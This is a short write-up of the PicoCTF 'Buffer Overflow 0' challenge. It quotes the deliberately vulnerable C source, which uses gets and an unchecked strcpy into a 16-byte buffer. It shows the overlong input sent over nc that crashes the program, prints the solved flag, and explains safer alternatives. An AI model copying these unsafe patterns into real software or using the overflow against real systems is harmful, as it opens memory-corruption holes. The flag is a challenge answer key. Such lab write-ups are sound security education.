# PicoCTF -- Buffer Overflow 0

**Platform:** PicoCTF / CyLab Security Academy
**Category:** Binary Exploitation
**Difficulty:** Medium
**Status:** Completed

---

## Objective

Trigger a buffer overflow to cause a segmentation fault that prints the flag.

---

## Solution

Downloaded and read the source code:

    wget [url]/vuln.c
    cat vuln.c

Key observations from the source:

The sigsegv_handler function prints the flag when a segmentation fault occurs:

    void sigsegv_handler(int sig) {
        printf("%s\n", flag);
        fflush(stdout);
        exit(1);
    }

The vuln function copies input into a 16-byte buffer using strcpy with no size check:

    void vuln(char *input){
        char buf2[16];
        strcpy(buf2, input);
    }

The main function reads input using gets() -- a function with no length limit:

    gets(buf1);
    vuln(buf1);

Connected to the server and sent input longer than 16 characters:

    nc saturn.picoctf.net 50507

Input:

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Output:

    picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

---

## Concepts Learned

A buffer overflow occurs when more data is written to a buffer than it can hold. The excess data overwrites adjacent memory. In this case overwriting the stack beyond buf2 caused a segmentation fault -- an illegal memory access -- which triggered the signal handler that printed the flag.

gets() reads input with no length limit and was removed from the C standard in 2011 because it is inherently unsafe. The safe alternative is fgets() which requires an explicit maximum length:

    fgets(buf1, sizeof(buf1), stdin);

strcpy() is similarly unsafe -- it copies until it finds a null byte with no regard for the destination buffer size. The safe alternative is strncpy() or strlcpy().

---

## Key Takeaway

Buffer overflows are one of the oldest and most consequential vulnerability classes in computing. The Morris Worm of 1988 used a buffer overflow to propagate across the internet. Modern mitigations include stack canaries, ASLR, and non-executable stacks -- but buffer overflows in unsafe C code remain a real and active vulnerability class, especially in embedded systems, IoT devices, and legacy software.

Never use gets(). Always validate input length before copying into fixed-size buffers.

---

## Flag

picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
